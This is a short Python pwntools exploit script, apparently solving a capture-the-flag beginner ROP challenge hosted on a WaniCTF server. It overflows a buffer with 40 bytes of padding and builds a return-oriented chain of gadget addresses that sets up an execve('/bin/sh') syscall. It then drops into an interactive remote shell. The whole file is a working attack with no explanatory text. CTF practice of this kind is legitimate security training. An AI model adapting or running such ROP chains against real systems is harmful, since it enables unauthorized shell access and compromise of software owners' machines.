from pwn import *

#p = process("./chall")
p = remote("beginners-rop-pwn.wanictf.org", 9005)
#p = gdb.debug('./chall', '''
#break *main
#b *main+157
#b *main+230
#''')

# ROP gadgets
# (59) execve('/bin/sh', 0, 0)
pop_rax = 0x401371 #59
rdi_gdt = 0x40139c #
xor_rsi = 0x40137e #0
xor_rdx = 0x40138d #0
syscall = 0x4013af


padA = b'A' * 40
padB = b'/bin/sh\0'
padC = b'C' * (96 - 8 - 40)

p.recvline()
p.sendline(padA + p64(pop_rax) + p64(0x3b) + p64(xor_rsi) + p64(xor_rdx) + p64(rdi_gdt) + padB + p64(syscall) + padC)
p.interactive()
